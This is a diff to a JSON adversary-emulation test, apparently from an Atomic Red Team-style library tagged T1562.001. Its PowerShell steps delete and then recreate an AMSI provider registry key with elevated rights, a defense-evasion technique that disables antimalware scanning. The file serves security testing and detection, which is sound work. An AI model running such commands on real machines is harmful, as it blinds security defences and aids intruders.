@@ -7,38 +7,38 @@
   ],
   "steps": [
     {
-      "id": "3475f4b4-cdd0-4f9c-9ffd-e31da2a3471e",
+      "id": "e0207865-e282-4098-91ee-98f14c672885",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "0596c760-5c4d-4f13-a656-eb61d162222c",
+      "id": "888c4c85-13b0-4e2c-b854-f142ef2c3424",
       "type": "execute-command",
       "data": {
         "command": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "3475f4b4-cdd0-4f9c-9ffd-e31da2a3471e",
+      "s": "e0207865-e282-4098-91ee-98f14c672885",
       "p": "on-success",
-      "o": "0596c760-5c4d-4f13-a656-eb61d162222c"
+      "o": "888c4c85-13b0-4e2c-b854-f142ef2c3424"
     },
     {
-      "s": "3475f4b4-cdd0-4f9c-9ffd-e31da2a3471e",
+      "s": "e0207865-e282-4098-91ee-98f14c672885",
       "p": "on-failure",
-      "o": "0596c760-5c4d-4f13-a656-eb61d162222c"
+      "o": "888c4c85-13b0-4e2c-b854-f142ef2c3424"
     }
   ],
   "tags": [
-    "T1562.001",
-    "atomic-red-team"
+    "T1562",
+    "T1562.001"
   ]
 }
